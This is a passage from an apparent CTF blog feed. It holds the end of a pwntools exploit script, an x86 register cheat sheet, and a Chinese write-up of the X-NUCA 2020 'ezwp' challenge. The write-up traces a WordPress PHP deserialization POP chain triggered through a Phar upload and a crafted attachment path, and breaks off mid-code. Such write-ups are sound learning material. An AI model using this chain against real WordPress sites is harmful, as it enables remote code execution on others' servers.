<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;How many EXP did you earned? : &#x27;</span>, s)</span><br><span class="line">log.success(<span class="string">&#x27;Got flag: &#x27;</span> + conn.recvline())</span><br><span class="line"></span><br><span class="line"><span class="comment"># conn.interactive()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Register CheatSheet</title>
      <link href="/2021/08/10/Register-CheatSheet/"/>
      <url>/2021/08/10/Register-CheatSheet/</url>
      
        <content type="html"><![CDATA[<h1 id="x86-32bit"><a href="#x86-32bit" class="headerlink" title="x86-32bit"></a>x86-32bit</h1><table><thead><tr><th align="center">Register</th><th align="center">Lower 16 bits</th><th align="center">High 8 bits of lower 16 bits</th><th align="center">Low 8 bits of lower 16 bits</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">eax</td><td align="center">ax</td><td align="center">ah</td><td align="center">al</td><td align="center">accumulator</td></tr><tr><td align="center">ebx</td><td align="center">bx</td><td align="center">bh</td><td align="center">bl</td><td align="center">base register</td></tr><tr><td align="center">ecx</td><td align="center">cx</td><td align="center">ch</td><td align="center">cl</td><td align="center">counter register</td></tr><tr><td align="center">edx</td><td align="center">dx</td><td align="center">dh</td><td align="center">dl</td><td align="center">data register - can be used for I/O port access and arithmetic functions</td></tr><tr><td align="center">esi</td><td align="center">si</td><td align="center"></td><td align="center"></td><td align="center">source index register</td></tr><tr><td align="center">edi</td><td align="center">di</td><td align="center"></td><td align="center"></td><td align="center">destination index register</td></tr><tr><td align="center">ebp</td><td align="center">bp</td><td align="center"></td><td align="center"></td><td align="center">base pointer register</td></tr><tr><td align="center">esp</td><td align="center">sp</td><td align="center"></td><td align="center"></td><td align="center">Stack pointer</td></tr><tr><td align="center">eip</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">instruction pointer</td></tr><tr><td align="center">flags</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">flags</td></tr></tbody></table><h1 id="x86-64bit"><a href="#x86-64bit" class="headerlink" title="x86-64bit"></a>x86-64bit</h1><table><thead><tr><th align="center">Register</th><th align="center">Lower 32 bits</th><th align="center">Lower 16 bits</th><th align="center">High 8 bits of lower 16 bits</th><th align="center">Low 8 bits of lower 16 bits</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">rax</td><td align="center">eax</td><td align="center">ax</td><td align="center">ah</td><td align="center">al</td><td align="center">accumulator</td></tr><tr><td align="center">rbx</td><td align="center">ebx</td><td align="center">bx</td><td align="center">bh</td><td align="center">bl</td><td align="center">base register</td></tr><tr><td align="center">rcx</td><td align="center">ecx</td><td align="center">cx</td><td align="center">ch</td><td align="center">cl</td><td align="center">counter register</td></tr><tr><td align="center">rdx</td><td align="center">edx</td><td align="center">dx</td><td align="center">dh</td><td align="center">dl</td><td align="center">data register - can be used for I/O port access and arithmetic functions</td></tr><tr><td align="center">rsi</td><td align="center">esi</td><td align="center">si</td><td align="center"></td><td align="center">sil</td><td align="center">source index register</td></tr><tr><td align="center">rdi</td><td align="center">edi</td><td align="center">di</td><td align="center"></td><td align="center">dil</td><td align="center">destination index register</td></tr><tr><td align="center">rbp</td><td align="center">ebp</td><td align="center">bp</td><td align="center"></td><td align="center">bpl</td><td align="center">base pointer register</td></tr><tr><td align="center">rsp</td><td align="center">esp</td><td align="center">sp</td><td align="center"></td><td align="center">spl</td><td align="center">Stack pointer</td></tr><tr><td align="center">r8</td><td align="center">r8d</td><td align="center">r8w</td><td align="center"></td><td align="center">r8b</td><td align="center"></td></tr><tr><td align="center">r9</td><td align="center">r9d</td><td align="center">r9w</td><td align="center"></td><td align="center">r9b</td><td align="center"></td></tr><tr><td align="center">r10</td><td align="center">r10d</td><td align="center">r10w</td><td align="center"></td><td align="center">r10b</td><td align="center"></td></tr><tr><td align="center">r11</td><td align="center">r11d</td><td align="center">r11w</td><td align="center"></td><td align="center">r11b</td><td align="center"></td></tr><tr><td align="center">r12</td><td align="center">r12d</td><td align="center">r12w</td><td align="center"></td><td align="center">r12b</td><td align="center"></td></tr><tr><td align="center">r13</td><td align="center">r13d</td><td align="center">r13w</td><td align="center"></td><td align="center">r13b</td><td align="center"></td></tr><tr><td align="center">r14</td><td align="center">r14d</td><td align="center">r14w</td><td align="center"></td><td align="center">r14b</td><td align="center"></td></tr><tr><td align="center">r15</td><td align="center">R15d</td><td align="center">r15w</td><td align="center"></td><td align="center">r15b</td><td align="center"></td></tr><tr><td align="center">rip</td><td align="center"></td><td align="center">0x09</td><td align="center"></td><td align="center"></td><td align="center">instruction pointer</td></tr><tr><td align="center">rflags</td><td align="center"></td><td align="center">0x0a</td><td align="center"></td><td align="center"></td><td align="center">flags</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> CheatSheet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X-nuca 2020 ezwp Writeup</title>
      <link href="/2020/12/10/XNUCA2020-ezwp-Writeup/"/>
      <url>/2020/12/10/XNUCA2020-ezwp-Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h1><p>题目直接给了一个 WordPress 的整站，题目附件除了源码还很贴心的给了数据库，在本地搭建好环境以后就可以调试了。先是用 wpscan 扫描一下，发现除了 Contact-Form-7 插件，整个站包括 wordpress 都是最新版，从数据库中可以看到有一个 admin 的管理员用户，但是并没有给出 admin 的密码，一般来说题目是不会让你去爆破管理员密码的，所以题目肯定是需要注册一个低等级账号进行提权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--</span><br><span class="line">-- Dumping data for table `wp_users`</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">LOCK TABLES `wp_users` WRITE;</span><br><span class="line">/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `wp_users` VALUES (1,&#x27;admin&#x27;,&#x27;&#x27;,&#x27;admin&#x27;,&#x27;admin@qq.com&#x27;,&#x27;http://192.168.248.151&#x27;,&#x27;2020-12-05 09:10:11&#x27;,&#x27;&#x27;,0,&#x27;admin&#x27;);</span><br><span class="line">/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;</span><br><span class="line">UNLOCK TABLES;</span><br></pre></td></tr></table></figure><p>再看过期的 Contact-Foem-7 插件，它的版本是 5.0.3，而最新版已经是 5.3.1，5.0.3 版本是存在漏洞的，所以题目的预期解应该是需要利用该插件去提权，但是在比赛中并没有完全利用成功，而是使用了另一种非预期解反序列化执行命令拿到了 flag，关于 Contact-Foem-7 插件的利用，将在 0x6 节中详细分析。</p><h1 id="Unserialize-POP-Chain"><a href="#Unserialize-POP-Chain" class="headerlink" title="Unserialize POP Chain"></a>Unserialize POP Chain</h1><p>题目最终的目的是执行命令，运行根目录下的 readflag 程序获取 flag，所以首先就需要找到一个可以执行任意命令或者代码的地方。在文件 FilteredIterator.php 中有一个 Requests_Utility_FilteredIterator 类，该类继承自数组迭代器，在 current 方法中会执行<code>call_user_func($this-&gt;callback, $value);</code>，这看起来是一个非常漂亮的执行 php 代码的地方，只要可以控制该类的 data 与 callback 成员变量，就可以执行任意数量参数的 php 函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/Requests/Utility/FilteredIterator.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requests_Utility_FilteredIterator</span> <span class="keyword">extends</span> <span class="title">ArrayIterator</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Callback to run as a filter</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> callable</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$callback</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new iterator</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> callable $callback Callback to be called on each value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$callback</span></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;callback = <span class="variable">$callback</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the current item&#x27;s value after filtering</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">current</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">current</span>();</span><br><span class="line">        <span class="variable">$value</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;callback, <span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 php 中迭代器主要在 foreach 中使用（例如 php 的原生数组 Array 类），当一个迭代器在 foreach 中开始迭代的时候，每次迭代都将会调用 current 函数以返回一个迭代器中存储的对象，所以只需要对 Requests_Utility_FilteredIterator 类进行迭代就可以自动触发 call_user_func。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;b&#x27;</span>=&gt;<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以下一步就是需要找到一个魔术方法，该魔术方法中会对自身的某一个成员变量进行 foreach 迭代。对于魔术方法的寻找，很多人可能喜欢去寻找__wakeup 或者__toString，但是其实最佳的目标就是构造函数__construct 和析构函数__destruct，这两个函数会经常在各种类中出现，而且触发方式非常简单，经过长时间的寻找，很幸运，在插件 all-in-one-event-calendar 中就存在 Ai1ec_Shutdown_Controller 类的析构函数，该析构函数中会对 $this-&gt;_preserve 遍历进行迭代。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-content/plugins/all-in-one-event-calendar/app/controller/shutdown.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ai1ec_Shutdown_Controller</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// replace globals from our internal store</span></span><br><span class="line">            <span class="variable">$restore</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_preserve <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$class</span> ) &#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，我们找到了一个可以成功触发反序列化的 POP 链：对 Ai1ec_Shutdown_Controller 类进行序列化，该类的_preserve 变量需要设置为一个 Requests_Utility_FilteredIterator 类，这个类中的 callback 与 value 组合就可以执行任意 php 函数。</p><h1 id="Exploit-Chain"><a href="#Exploit-Chain" class="headerlink" title="Exploit Chain"></a>Exploit Chain</h1><p>利用上节中构造的 POP 链，就可以利用反序列化执行任意 php 函数，但是接下来还需要找到一个地方可以触发反序列化，在 WordPress 中直接利用 unserialize 函数进行反序列化可能性不大，但是 WordPress 中是可以上传文件的，我们可以上传一个 Phar 文件，最后利用 phar 伪协议即可触发 POP 链。</p><p>最开始我们需要找到一个可以触发伪协议的地方，Phar 伪协议的触发需要使用 php 文件系统函数，如下所示第 27 行的 file_exists 函数看起来是一个很好的选择。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve thumbnail for an attachment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int $post_id Optional. Attachment ID. Default 0.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string|false False on failure. Thumbnail file path on success.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_get_attachment_thumb_file</span>(<span class="params"> <span class="variable">$post_id</span> = <span class="number">0</span> </span>) </span>&#123;</span><br><span class="line">    <span class="variable">$post_id</span> = (<span class="keyword">int</span>) <span class="variable">$post_id</span>;</span><br><span class="line">    <span class="variable">$post</span>    = <span class="title function_ invoke__">get_post</span>(<span class="variable">$post_id</span> );</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$post</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$imagedata</span> = <span class="title function_ invoke__">wp_get_attachment_metadata</span>(<span class="variable">$post</span>-&gt;ID );</span><br><span class="line">    <span class="keyword">if</span> (! <span class="title function_ invoke__">is_array</span>(<span class="variable">$imagedata</span> ) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_attached_file</span>(<span class="variable">$post</span>-&gt;ID );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$imagedata</span>[<span class="string">&#x27;thumb&#x27;</span>] ) ) &#123;</span><br><span class="line">        <span class="variable">$thumbfile</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$file</span> ), <span class="variable">$imagedata</span>[<span class="string">&#x27;thumb&#x27;</span>], <span class="variable">$file</span> );</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$thumbfile</span> ) ) &#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * Filters the attachment thumbnail file path.</span></span><br><span class="line"><span class="comment">             *</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment">             *</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> string $thumbfile File path to the attachment thumbnail.</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> int    $post_id   Attachment ID.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;wp_get_attachment_thumb_file&#x27;</span>, <span class="variable">$thumbfile</span>, <span class="variable">$post</span>-&gt;ID );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要使 thumbfile 的值可控，可以看到 thumbfile 的值是从 file 与 imagedata 来的，再看 get_attached_file 函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve attached file path based on attachment ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * By default the path will go through the &#x27;get_attached_file&#x27; filter, but</span></span><br><span class="line"><span class="comment"> * passing a true to the $unfiltered argument of get_attached_file() will</span></span><br><span class="line"><span class="comment"> * return the file path unfiltered.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The function works by getting the single post meta name, named</span></span><br><span class="line"><span class="comment"> * &#x27;_wp_attached_file&#x27; and returning it. This is a convenience function to</span></span><br><span class="line"><span class="comment"> * prevent looking up the meta name and provide a mechanism for sending the</span></span><br><span class="line"><span class="comment"> * attached filename through a filter.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.0.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int  $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool $unfiltered    Optional. Whether to apply filters. Default false.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string|false The file path to where the attached file should be, false otherwise.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_attached_file</span>(<span class="params"> <span class="variable">$attachment_id</span>, <span class="variable">$unfiltered</span> = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_post_meta</span>(<span class="variable">$attachment_id</span>, <span class="string">&#x27;_wp_attached_file&#x27;</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the file is relative, prepend upload dir.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span> &amp;&amp; <span class="number">0</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&#x27;/&#x27;</span> ) &amp;&amp; ! <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;|^.:\\\|&#x27;</span>, <span class="variable">$file</span> ) ) &#123;</span><br><span class="line">        <span class="variable">$uploads</span> = <span class="title function_ invoke__">wp_get_upload_dir</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$uploads</span>[<span class="string">&#x27;error&#x27;</span>] ) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable">$uploads</span>[<span class="string">&#x27;basedir&#x27;</span>] . <span class="string">&quot;/<span class="subst">$file</span>&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$unfiltered</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Filters the attached file based on the given ID.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string|false $file          The file path to where the attached file should be, false otherwise.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> int          $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;get_attached_file&#x27;</span>, <span class="variable">$file</span>, <span class="variable">$attachment_id</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数首先从数据库中_wp_attached_file 字段读取附件路径，而_wp_attached_file 是我们可以控制的，具体的控制方法会在后文中提到，控制了 file 以后不能让程序流程进入 25 行的 if 中，否则会在 file 前面拼接上传目录，导致 file 只能部分可控。</p><p>再看 wp_get_attachment_thumb_file 函数中完全控制 thumbfile 的条件是 <code>str_replace(basename( $file), $imagedata[&#39;thumb&#39;], $file )</code>，如果 basename(file) 和 file 的值相同，那么该语句就会直接返回 imagedata[‘thumb’]，需要注意的是站点运行在 Linux 上，如果输入的 file 是一个 Windows 下的路径例如<code>Z:\Z</code>，就可以满足正则，从而不会进入到 if 中，而外面的 basename 就会将其当作一个目录，直接返回 file（假如站点运行在 Windows 上，basename 会返回”Z”，Linux 下直接返回”Z:\Z”）。</p><p>再看 imagedata 是怎么来的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieves attachment metadata for attachment ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int  $attachment_id Attachment post ID. Defaults to global $post.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool $unfiltered    Optional. If true, filters are not run. Default false.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array|false &#123;</span></span><br><span class="line"><span class="comment"> *     Attachment metadata. False on failure.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $width      The width of the attachment.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $height     The height of the attachment.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> string $file       The file path relative to `wp-content/uploads`.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> array  $sizes      Keys are size slugs, each value is an array containing</span></span><br><span class="line"><span class="comment"> *                              &#x27;file&#x27;, &#x27;width&#x27;, &#x27;height&#x27;, and &#x27;mime-type&#x27;.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> array  $image_meta Image metadata.</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_get_attachment_metadata</span>(<span class="params"> <span class="variable">$attachment_id</span> = <span class="number">0</span>, <span class="variable">$unfiltered</span> = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">    <span class="variable">$attachment_id</span> = (<span class="keyword">int</span>) <span class="variable">$attachment_id</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$post</span> = <span class="title function_ invoke__">get_post</span>(<span class="variable">$attachment_id</span> );</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$post</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">get_post_meta</span>(<span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_wp_attachment_metadata&#x27;</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$unfiltered</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Filters the attachment meta data.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array|bool $data          Array of meta data for the given attachment, or false</span></span><br><span class="line"><span class="comment">     *                                  if the object does not exist.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> int        $attachment_id Attachment post ID.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">apply_filters</span>(<span class="string">&#x27;wp_get_attachment_metadata&#x27;</span>, <span class="variable">$data</span>, <span class="variable">$post</span>-&gt;ID );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 imagedata 就是数据库中的_wp_attachment_metadata 字段，而该字段也是可控的。在可以完全控制 thumbfile 以后我们需要找到一个可以调用 wp_get_attachment_thumb_file 函数的地方。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 